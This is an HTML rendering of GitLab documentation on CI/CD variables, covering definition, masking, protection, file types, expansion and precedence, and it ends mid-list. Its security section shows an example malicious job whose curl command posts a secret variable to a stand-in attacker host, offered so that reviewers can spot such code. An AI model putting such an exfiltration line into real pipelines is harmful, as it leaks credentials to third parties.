<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># Predefined CI/CD variables</title>
    <link rel="stylesheet" href="/../../style.css">
</head>
<body>
    <pre><code><hr />
<p>stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments
title: GitLab CI/CD variables
description: Configuration, usage, and security.</p>
<hr />
<p>{{&lt; details &gt;}}</p>
<ul>
<li>Tier: Free, Premium, Ultimate</li>
<li>Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated</li>
</ul>
<p>{{&lt; /details &gt;}}</p>
<p>CI/CD variables are a type of environment variable. You can use them to:</p>
<ul>
<li>Control the behavior of jobs and pipelines.</li>
<li>Store values you want to re-use, for example in <a href="job_scripts.html">job scripts</a>.</li>
<li>Avoid hard-coding values in your <code>.gitlab-ci.yml</code> file.</li>
</ul>
<p>Variable names are limited by the <a href="https://docs.gitlab.com/runner/shells/">shell the runner uses</a>
to execute scripts. Each shell has its own set of reserved variable names.</p>
<p>To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the <a href="https://docs.ruby-lang.org/en/master/Psych.html">Psych YAML parser</a>,
so quoted and unquoted variables might be parsed differently. For example, <code>VAR1: 012345</code>
is interpreted as an octal value, so the value becomes <code>5349</code>, but <code>VAR1: "012345"</code> is parsed
as a string with a value of <code>012345</code>.</p>
<p>For more information about advanced use of GitLab CI/CD, see <a href="https://about.gitlab.com/webcast/7cicd-hacks/">7 advanced GitLab CI workflow hacks</a> shared by GitLab engineers.</p>
<h2>Predefined CI/CD variables</h2>
<p>GitLab CI/CD makes a set of <a href="predefined_variables.html">predefined CI/CD variables</a>
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.</p>
<p>You can use predefined CI/CD variables in your <code>.gitlab-ci.yml</code> without declaring them first.
For example:</p>
<pre><code class="language-yaml">job1:
  stage: test
  script:
    - echo &quot;The job's stage is '$CI_JOB_STAGE'&quot;
</code></pre>
<p>The script in this example outputs <code>The job's stage is 'test'</code>.</p>
<h2>Define a CI/CD variable in the <code>.gitlab-ci.yml</code> file</h2>
<p>To create a CI/CD variable in the <code>.gitlab-ci.yml</code> file, define the variable and
value with the <a href="../yaml/_index.md#variables"><code>variables</code></a> keyword.</p>
<p>Variables saved in the <code>.gitlab-ci.yml</code> file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a <code>DATABASE_URL</code> variable. Sensitive variables containing values
like secrets or keys should be added in the UI.</p>
<p>You can define <code>variables</code> in:</p>
<ul>
<li>A job: The variable is only available in that job's <code>script</code>, <code>before_script</code>, or <code>after_script</code> sections, and with some <a href="../yaml/_index.md#job-keywords">job keywords</a>.</li>
<li>The top-level of the <code>.gitlab-ci.yml</code> file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job's variable takes precedence.</li>
</ul>
<p>In both cases, you cannot use these variables with <a href="../yaml/_index.md#global-keywords">global keywords</a>.</p>
<p>For example:</p>
<pre><code class="language-yaml">variables:
  ALL_JOBS_VAR: &quot;A default variable&quot;

job1:
  variables:
    JOB1_VAR: &quot;Job 1 variable&quot;
  script:
    - echo &quot;Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'&quot;

job2:
  variables:
    ALL_JOBS_VAR: &quot;Different value than default&quot;
    JOB2_VAR: &quot;Job 2 variable&quot;
  script:
    - echo &quot;Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'&quot;
</code></pre>
<p>In this example:</p>
<ul>
<li><code>job1</code> outputs: <code>Variables are 'A default variable' and 'Job 1 variable'</code></li>
<li><code>job2</code> outputs: <code>Variables are 'Different value than default', 'Job 2 variable', and ''</code></li>
</ul>
<p>Use the <code>value</code> and <code>description</code> keywords to define <a href="../pipelines/_index.md#prefill-variables-in-manual-pipelines">variables that are prefilled</a>
for manually-triggered pipelines.</p>
<h3>Skip default variables in a single job</h3>
<p>If you don't want default variables to be available in a job, set <code>variables</code> to <code>{}</code>:</p>
<pre><code class="language-yaml">variables:
  DEFAULT_VAR: &quot;A default variable&quot;

job1:
  variables: {}
  script:
    - echo This job does not need any variables
</code></pre>
<h2>Define a CI/CD variable in the UI</h2>
<p>Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not in the <code>.gitlab-ci.yml</code> file.</p>
<p>By default, pipelines from forked projects can't access the CI/CD variables available to the parent project.
If you <a href="../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project">run a merge request pipeline in the parent project for a merge request from a fork</a>,
all variables become available to the pipeline.</p>
<h3>For a project</h3>
<p>{{&lt; history &gt;}}</p>
<ul>
<li>Default visibility <a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494">changed</a> from <strong>Visible</strong> to <strong>Masked</strong> in GitLab 18.3.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can add CI/CD variables to a project's settings. Projects can have a maximum of 8000 CI/CD variables.</p>
<p>Prerequisites:</p>
<ul>
<li>You must be a project member with the Maintainer role.</li>
</ul>
<p>To add or update variables in the project settings:</p>
<ol>
<li>On the top bar, select <strong>Search or go to</strong> and find your project.</li>
<li>Select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Select <strong>Add variable</strong> and fill in the details:</li>
<li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li>
<li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system. The value has extra limitations if <strong>Visibility</strong> is set to <strong>Masked</strong>
     or <strong>Masked and hidden</strong>.</li>
<li><strong>Type</strong>: <code>Variable</code> (default) or <a href="#use-file-type-cicd-variables"><code>File</code></a>.</li>
<li><strong>Environment scope</strong>: Optional. <strong>All (default)</strong> (<code>*</code>), a specific <a href="../environments/_index.html">environment</a>,
     or a wildcard environment scope.</li>
<li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
     that run on protected branches or protected tags.</li>
<li><strong>Visibility</strong>: Select <strong>Visible</strong>, <strong>Masked</strong> (default), or <strong>Masked and hidden</strong>.</li>
<li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li>
</ol>
<p>Alternatively, project variables can be added <a href="../../api/project_level_variables.html">by using the API</a>.</p>
<h3>For a group</h3>
<p>{{&lt; history &gt;}}</p>
<ul>
<li>Default visibility <a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494">changed</a> from <strong>Visible</strong> to <strong>Masked</strong> in GitLab 18.3.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.</p>
<p>Prerequisites:</p>
<ul>
<li>You must be a group member with the Owner role.</li>
</ul>
<p>To add a group variable:</p>
<ol>
<li>On the top bar, select <strong>Search or go to</strong> and find your group.</li>
<li>Select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Select <strong>Add variable</strong> and fill in the details:</li>
<li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li>
<li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system. The value has extra limitations if <strong>Visibility</strong> is set to <strong>Masked</strong>
     or <strong>Masked and hidden</strong>.</li>
<li><strong>Type</strong>: <code>Variable</code> (default) or <a href="#use-file-type-cicd-variables"><code>File</code></a>.</li>
<li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
     that run on protected branches or protected tags.</li>
<li><strong>Visibility</strong>: Select <strong>Visible</strong>, <strong>Masked</strong> (default), <strong>Masked and hidden</strong>.</li>
<li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li>
</ol>
<p>The group variables that are available in a project are listed in the project's
<strong>Settings</strong> &gt; <strong>CI/CD</strong> &gt; <strong>Variables</strong> section. Variables from subgroups are recursively inherited.</p>
<p>Alternatively, group variables can be added <a href="../../api/group_level_variables.html">by using the API</a>.</p>
<h4>Environment scope</h4>
<p>{{&lt; details &gt;}}</p>
<ul>
<li>Tier: Premium, Ultimate</li>
</ul>
<p>{{&lt; /details &gt;}}</p>
<p>To set a group CI/CD variable to only be available for certain environments:</p>
<ol>
<li>On the top bar, select <strong>Search or go to</strong> and find your group.</li>
<li>Select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>To the right of the variable, select <strong>Edit</strong> ({{&lt; icon name="pencil" &gt;}}).</li>
<li>For <strong>Environment scope</strong>, select <strong>All (default)</strong> (<code>*</code>), a specific <a href="../environments/_index.html">environment</a>,
   or a wildcard environment scope.</li>
</ol>
<h3>For an instance</h3>
<p>{{&lt; details &gt;}}</p>
<ul>
<li>Tier: Free, Premium, Ultimate</li>
<li>Offering: GitLab Self-Managed, GitLab Dedicated</li>
</ul>
<p>{{&lt; /details &gt;}}</p>
<p>{{&lt; history &gt;}}</p>
<ul>
<li>Default visibility <a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494">changed</a> from <strong>Visible</strong> to <strong>Masked</strong> in GitLab 18.3.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can make a CI/CD variable available to all projects and groups in a GitLab instance.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have administrator access to the instance.</li>
</ul>
<p>To add an instance variable:</p>
<ol>
<li>In the upper-right corner, select <strong>Admin</strong>.</li>
<li>Select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Select <strong>Add variable</strong> and fill in the details:</li>
<li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li>
<li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system. No other limitations if <strong>Visibility</strong> set to <strong>Visible</strong>.</li>
<li><strong>Type</strong>: <code>Variable</code> (default) or <code>File</code>.</li>
<li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
     that run on protected branches or tags.</li>
<li><strong>Visibility</strong>: Select <strong>Visible</strong>, <strong>Masked</strong> (default), or <strong>Masked and hidden</strong>.</li>
<li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li>
</ol>
<p>Alternatively, instance variables can be added <a href="../../api/instance_level_ci_variables.html">by using the API</a>.</p>
<h2>CI/CD variable security</h2>
<p>Code pushed to the <code>.gitlab-ci.yml</code> file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.</p>
<p>Review all merge requests that introduce changes to the <code>.gitlab-ci.yml</code> file before you:</p>
<ul>
<li><a href="../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project">Run a pipeline in the parent project for a merge request submitted from a forked project</a>.</li>
<li>Merge the changes.</li>
</ul>
<p>Review the <code>.gitlab-ci.yml</code> file of imported projects before you add files or run pipelines against them.</p>
<p>The following example shows malicious code in a <code>.gitlab-ci.yml</code> file:</p>
<pre><code class="language-yaml">accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo &quot;This script logs into the DB with $USER $PASSWORD&quot;
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data &quot;secret_variable=$SECRET_VARIABLE&quot; &quot;https://maliciouswebsite.abcd/&quot;
</code></pre>
<p>To help reduce the risk of accidentally leaking secrets through scripts like in <code>accidental-leak-job</code>,
all variables containing sensitive information should always be masked in job logs.
You can also <a href="#protect-a-cicd-variable">limit a variable to protected branches and tags only</a>.</p>
<p>Alternatively, <a href="../secrets/_index.html">connect with an external secrets management provider</a>
to store and retrieve secrets.</p>
<p>Malicious scripts like in <code>malicious-job</code> must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.</p>
<p>Variable values are encrypted using <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard"><code>aes-256-cbc</code></a>
and stored in the database. This data can be read and decrypted with a
valid <a href="../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost">secrets file</a>.</p>
<h3>Mask a CI/CD variable</h3>
<p>{{&lt; alert type="warning" &gt;}}</p>
<p>Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using <a href="../secrets/_index.html">external secrets</a> and <a href="#use-file-type-cicd-variables">file type variables</a>
to prevent commands such as <code>env</code> or <code>printenv</code> from printing secret variables.</p>
<p>{{&lt; /alert &gt;}}</p>
<p>You can mask a CI/CD variable for a project, group, or instance to prevent
its value from appearing in job logs. When a job outputs the value of a
masked variable, the value is replaced with <code>[MASKED]</code> in the job log.
In some cases, the <code>[MASKED]</code> value could be followed by <code>x</code> characters as well.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the same role or access level as required to <a href="#define-a-cicd-variable-in-the-ui">add a CI/CD variable in the UI</a>.</li>
</ul>
<p>To mask a variable:</p>
<ol>
<li>For the group, project, or in the <strong>Admin</strong> area, select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Next to the variable you want to protect, select <strong>Edit</strong>.</li>
<li>Under <strong>Visibility</strong>, select <strong>Mask variable</strong>.</li>
<li>Recommended. Clear the <a href="#allow-cicd-variable-expansion"><strong>Expand variable reference</strong></a> checkbox.
   If variable expansion is enabled, the only non-alphanumeric characters you can use in
   the variable value are: <code>_</code>, <code>:</code>, <code>@</code>, <code>-</code>, <code>+</code>, <code>.</code>, <code>~</code>, <code>=</code>, <code>/</code>, and <code>~</code>.
   When the setting is disabled, all characters can be used.</li>
<li>Select <strong>Update variable</strong>.</li>
</ol>
<p>The value of the variable must:</p>
<ul>
<li>Be a single line with no spaces.</li>
<li>Be 8 characters or longer.</li>
<li>Not match the name of an existing predefined or custom CI/CD variable.</li>
</ul>
<p>If a process outputs the value in a slightly modified way, the value can't be masked.
For example, if the shell adds <code>\</code> to escape special characters, the value isn't masked:</p>
<ul>
<li>Example masked variable value: <code>My[value]</code></li>
<li>This output would not be masked: <code>My\[value\]</code></li>
</ul>
<p>When <code>CI_DEBUG_SERVICES</code> is enabled, the variable value might be revealed. For more information, see
<a href="../services/_index.md#capturing-service-container-logs">service container logging</a>.</p>
<h3>Hide a CI/CD variable</h3>
<p>{{&lt; history &gt;}}</p>
<ul>
<li><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/29674">Introduced</a> in GitLab 17.4 <a href="../../administration/feature_flags/_index.html">with a flag</a> named <code>ci_hidden_variables</code>. Enabled by default.</li>
<li><a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843">Generally available</a> in GitLab 17.6. Feature flag <code>ci_hidden_variables</code> removed.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the <strong>CI/CD</strong> settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the same role or access level as required to <a href="#define-a-cicd-variable-in-the-ui">add a CI/CD variable in the UI</a>.</li>
<li>The variable value must match the <a href="#mask-a-cicd-variable">requirements for masked variables</a>.</li>
</ul>
<p>To hide a variable, select <strong>Masked and hidden</strong> in the <strong>Visibility</strong> section when
you <a href="#define-a-cicd-variable-in-the-ui">add a new CI/CD variable in the UI</a>.
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.</p>
<h3>Protect a CI/CD variable</h3>
<p>You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on <a href="../../user/project/repository/branches/protected.html">protected branches</a>
or <a href="../../user/project/protected_tags.html">protected tags</a>.</p>
<p>Merged results pipelines and merge request pipelines can <a href="../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners">optionally access protected variables</a>.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the same role or access level as required to <a href="#define-a-cicd-variable-in-the-ui">add a CI/CD variable in the UI</a>.</li>
</ul>
<p>To set a variable as protected:</p>
<ol>
<li>For the project or group, go to <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Next to the variable you want to protect, select <strong>Edit</strong>.</li>
<li>Select the <strong>Protect variable</strong> checkbox.</li>
<li>Select <strong>Update variable</strong>.</li>
</ol>
<p>The variable is available for all subsequent pipelines.</p>
<h3>Use file type CI/CD variables</h3>
<p>All predefined CI/CD variables and variables defined in the <code>.gitlab-ci.yml</code> file
are "variable" type (<a href="../../api/project_level_variables.html"><code>"variable_type": "env_var"</code> in the API</a>).</p>
<p>Variable type variables:</p>
<ul>
<li>Consist of a key and value pair.</li>
<li>Are made available in jobs as environment variables, with:</li>
<li>The CI/CD variable key as the environment variable name.</li>
<li>The CI/CD variable value as the environment variable value.</li>
</ul>
<p>Project, group, and instance CI/CD variables are "variable" type by default, but can
optionally be set as a "file" type (<code>"variable_type": "file"</code> in the API).
File type variables:</p>
<ul>
<li>Consist of a key, value, and file.</li>
<li>Are made available in jobs as environment variables, with:</li>
<li>The CI/CD variable key as the environment variable name.</li>
<li>The CI/CD variable value saved to a temporary file.</li>
<li>The path to the temporary file as the environment variable value.</li>
</ul>
<p>Use file type CI/CD variables for tools that need a file as input.</p>
<p>For example, the AWS CLI and <code>kubectl</code> are both tools that use <code>File</code> type variables for configuration.
If you are using <code>kubectl</code> with:</p>
<ul>
<li>A variable with a key of <code>KUBE_URL</code> and <code>https://example.com</code> as the value.</li>
<li>A file type variable with a key of <code>KUBE_CA_PEM</code> and a certificate as the value.</li>
</ul>
<p>Pass <code>KUBE_URL</code> as a <code>--server</code> option, which accepts a variable, and pass <code>$KUBE_CA_PEM</code>
as a <code>--certificate-authority</code> option, which accepts a path to a file:</p>
<pre><code class="language-shell">kubectl config set-cluster e2e --server=&quot;$KUBE_URL&quot; --certificate-authority=&quot;$KUBE_CA_PEM&quot;
</code></pre>
<h4>Use a <code>.gitlab-ci.yml</code> variable as a file type variable</h4>
<p>You cannot set a CI/CD variable <a href="#define-a-cicd-variable-in-the-gitlab-ciyml-file">defined in the <code>.gitlab-ci.yml</code> file</a>
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the <code>.gitlab-ci.yml</code>:</p>
<ul>
<li>Run a command that saves the value of the variable in a file.</li>
<li>Use that file with your tool.</li>
</ul>
<p>For example:</p>
<pre><code class="language-yaml">variables:
  SITE_URL: &quot;https://gitlab.example.com&quot;

job:
  script:
    - echo &quot;$SITE_URL&quot; &gt; &quot;site-url.txt&quot;
    - mytool --url-file=&quot;site-url.txt&quot;
</code></pre>
<h2>Allow CI/CD variable expansion</h2>
<p>{{&lt; history &gt;}}</p>
<ul>
<li><strong>Expand variable</strong> option <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/410414">renamed</a> to <strong>Expand variable reference</strong> in GitLab 16.3.</li>
<li><a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144">Changed</a> to disabled by default in GitLab 18.6.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can set a variable to treat values with the <code>$</code> character as a reference to another variable.
When the pipeline runs, the reference expands to use the value of the referenced variable.</p>
<p>CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in
the <code>.gitlab-ci.yml</code> file, control variable expansion with the <a href="../yaml/_index.md#variablesexpand"><code>variables:expand</code> keyword</a>.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the same role or access level as required to <a href="#define-a-cicd-variable-in-the-ui">add a CI/CD variable in the UI</a>.</li>
</ul>
<p>To enable variable expansion for the variable:</p>
<ol>
<li>For the project or group, go to <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>Next to the variable you want to do not want expanded, select <strong>Edit</strong>.</li>
<li>Select the <strong>Expand variable reference</strong> checkbox.</li>
<li>Select <strong>Update variable</strong>.</li>
</ol>
<p>{{&lt; alert type="note" &gt;}}</p>
<p>Do not <a href="#mask-a-cicd-variable">mask</a> a variable value if you want to use variable expansion.
If both masking and variable expansion are combined, character limitations prevent
the use of the <code>$</code> to reference other variables.</p>
<p>{{&lt; /alert &gt;}}</p>
<h2>CI/CD variable precedence</h2>
<p>{{&lt; history &gt;}}</p>
<ul>
<li>Scan Execution Policies variable precedence was <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/424028">changed</a> in GitLab 16.7 <a href="../../administration/feature_flags/_index.html">with a flag</a> named <code>security_policies_variables_precedence</code>. Enabled by default. <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/435727">Feature flag removed in GitLab 16.8</a>.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.</p>
<p>The order of precedence for variables is (from highest to lowest):</p>
<ol>
<li><a href="../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables">Pipeline execution policy variables</a>.</li>
<li><a href="../../user/application_security/policies/scan_execution_policies.html">Scan execution policy variables</a>.</li>
<li><a href="#use-pipeline-variables">Pipeline variables</a>. These variables all have the same precedence:</li>
<li>Variables passed to downstream pipelines.</li>
<li>Trigger variables.</li>
<li>Scheduled pipeline variables.</li>
<li>Manual pipeline variables.</li>
<li>Variables added when creating a pipeline with the API.</li>
<li>Manual job variables.</li>
<li>Project variables.</li>
<li>Group variables. If the same variable name exists in a group and its subgroups,
   the job uses the value from the closest subgroup. For example, if you have
   <code>Group &gt; Subgroup 1 &gt; Subgroup 2 &gt; Project</code>, the variable defined in <code>Subgroup 2</code> takes precedence.</li>
<li>Instance variables.</li>
<li><a href="job_scripts.md#pass-an-environment-variable-to-another-job">Variables from <code>dotenv</code> reports</a>.</li>
<li>Job variables, defined in jobs in the <code>.gitlab-ci.yml</code> file.</li>
<li>Default variables for all jobs, defined at the top-level of the <code>.gitlab-ci.yml</code> file.</li>
<li><a href="predefined_variables.md#deployment-variables">Deployment variables</a>.</li>
<li><a href="predefined_variables.html">Predefined variables</a>.</li>
</ol>
<p>For example:</p>
<pre><code class="language-yaml">variables:
  API_TOKEN: &quot;default&quot;

job1:
  variables:
    API_TOKEN: &quot;secure&quot;
  script:
    - echo &quot;The variable is '$API_TOKEN'&quot;
</code></pre>
<p>In this example, <code>job1</code> outputs <code>The variable is 'secure'</code> because variables defined in jobs in the <code>.gitlab-ci.yml</code> file
have higher precedence than default variables.</p>
<h2>Use pipeline variables</h2>
<p>Pipeline variables are variables that are specified when running a new pipeline.</p>
<p>{{&lt; alert type="note" &gt;}}</p>
<p>In <a href="../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables">GitLab 17.7</a>
and later, <a href="../inputs/_index.md#for-a-pipeline">pipeline inputs</a> are recommended over passing pipeline variables.
For enhanced security, you should <a href="#restrict-pipeline-variables">disable pipeline variables</a> when using inputs.</p>
<p>{{&lt; /alert &gt;}}</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the Developer role in the project.</li>
</ul>
<p>You can specify a pipeline variable when you:</p>
<ul>
<li><a href="../jobs/job_control.md#specify-variables-when-running-manual-jobs">Run a pipeline manually</a> in the UI.</li>
<li>Create a <a href="../pipelines/schedules.md#create-a-pipeline-schedule">scheduled pipeline</a>.</li>
<li>Create a pipeline by using <a href="../../api/pipelines.md#create-a-new-pipeline">the <code>pipelines</code> API endpoint</a>.</li>
<li>Create a pipeline by using <a href="../triggers/_index.md#pass-cicd-variables-in-the-api-call">the <code>triggers</code> API endpoint</a>.</li>
<li>Use <a href="../../topics/git/commit.md#push-options-for-gitlab-cicd">push options</a>.</li>
<li>Pass variables to a downstream pipeline by using either the <a href="../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline"><code>variables</code> keyword</a>,
  <a href="../yaml/_index.md#triggerforward"><code>trigger:forward</code> keyword</a> or <a href="../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job"><code>dotenv</code> variables</a>.</li>
</ul>
<p>These variables have higher precedence and can override other defined variables,
including predefined variables.</p>
<p>{{&lt; alert type="warning" &gt;}}</p>
<p>You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.</p>
<p>{{&lt; /alert &gt;}}</p>
<h3>Restrict pipeline variables</h3>
<p>{{&lt; history &gt;}}</p>
<ul>
<li><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/440338">Introduced</a> in GitLab 17.1.</li>
<li>For GitLab.com, setting defaults <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/502382">updated for all new projects in new namespaces</a>
  to <code>no_one_allowed</code> for <code>ci_pipeline_variables_minimum_override_role</code> in GitLab 17.7.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>You can limit who can run pipelines with pipeline variables to specific user roles.
When users with a lower role try to use pipeline variables, they receive an
<code>Insufficient permissions to set pipeline variables</code> error message.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the Maintainer role in the project. If the minimum role was previously set to <code>owner</code>
  or <code>no_one_allowed</code>, then you must have the Owner role in the project.</li>
</ul>
<p>To limit the use of pipeline variables to only the Maintainer role and higher:</p>
<ul>
<li>Go to <strong>Settings</strong> &gt; <strong>CI/CD</strong> &gt; <strong>Variables</strong>.</li>
<li>Under <strong>Minimum role to use pipeline variables</strong>, select one of:</li>
<li><code>no_one_allowed</code>: No pipelines can run with pipeline variables.
    Default for new projects in new namespaces on GitLab.com.</li>
<li><code>owner</code>: Only users with the Owner role can run pipelines with pipeline variables.
    You must have the Owner role for the project to change the setting to this value.</li>
<li><code>maintainer</code>: Only users with at least the Maintainer role can run pipelines with pipeline variables.
    Default when not specified on GitLab Self-Managed and GitLab Dedicated.</li>
<li><code>developer</code>: Only users with at least the Developer role can run pipelines with pipeline variables.</li>
</ul>
<p>You can also use <a href="../../api/projects.md#edit-a-project">the projects API</a> to set
the role for the <code>ci_pipeline_variables_minimum_override_role</code> setting.</p>
<p>This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the <code>variables</code> keyword in the YAML configuration, but not
jobs that use the <code>trigger</code> keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.</p>
<h4>Enable pipeline variable restriction for multiple projects</h4>
<p>{{&lt; history &gt;}}</p>
<ul>
<li><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/514242">Introduced</a> in GitLab 18.4.</li>
</ul>
<p>{{&lt; /history &gt;}}</p>
<p>For groups with many projects, you can disable pipeline variables
in all projects that don't currently use them. This option sets the
<strong>Minimum role to use pipeline variables</strong> setting to <code>no_one_allowed</code> for projects
that have never used pipeline variables.</p>
<p>Prerequisites:</p>
<ul>
<li>You must have the Owner role for the group.</li>
</ul>
<p>To enable the pipeline variable restriction setting in projects in the group:</p>
<ol>
<li>On the top bar, select <strong>Search or go to</strong> and find your group.</li>
<li>Select <strong>Settings</strong> &gt; <strong>CI/CD</strong>.</li>
<li>Expand <strong>Variables</strong>.</li>
<li>In the <strong>Disable pipeline variables in projects that don't use them</strong> section,
   select <strong>Start migration</strong>.</li>
</ol>
<p>The migration runs in the background. You receive an email notification
when the migration is complete. Project maintainers can later change the setting
for their individual projects if needed.</p>
<h2>Exporting variables</h2>
<p>Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.</p>
<p>This means that if a job fails, variables created by user-defined scripts are not
exported.</p>
<p>When runners execute jobs defined in <code>.gitlab-ci.yml</code>:</p>
<ul>
<li>Scripts specified in <code>before_script</code> and the main script are executed together in
  a single shell context, and are concatenated.</li>
<li>Scripts specified in <code>after_script</code> run in a shell context completely separate to
  the <code>before_script</code> and the specified scripts.</li>
</ul>
<p>Regardless of the shell the scripts are executed in, the runner output includes:</p>
<ul>
<li>Predefined variables.</li>
<li>Variables defined in:</li>
<li>Instance, group, or project CI/CD settings.</li>
<li>The <code>.gitlab-ci.yml</code> file in the <code>variables:</code> section.</li>
<li>The <code>.gitlab-ci.yml</code> file in the <code>secrets:</code> section.</li>
<li>The <code>config.toml</code>.</li>
</ul>
<p>The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like <code>export MY_VARIABLE=1</code>.</p>
<p>For example, in the following <code>.gitlab-ci.yml</code> file, the following scripts are defined:</p>
<pre><code class="language-yaml">job:
 variables:
   JOB_DEFINED_VARIABLE: &quot;job variable&quot;
 before_script:
   - echo &quot;This is the 'before_script' script&quot;
   - export MY_VARIABLE=&quot;variable&quot;
 script:
   - echo &quot;This is the 'script' script&quot;
   - echo &quot;JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}&quot;
   - echo &quot;CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}&quot;
   - echo &quot;MY_VARIABLE's value is ${MY_VARIABLE}&quot;
 after_script:
   - echo &quot;JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}&quot;
   - echo &quot;CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}&quot;
   - echo &quot;MY_VARIABLE's value is ${MY_VARIABLE}&quot;
</code></pre>
<p>When the runner executes the job:</p>
<ol>
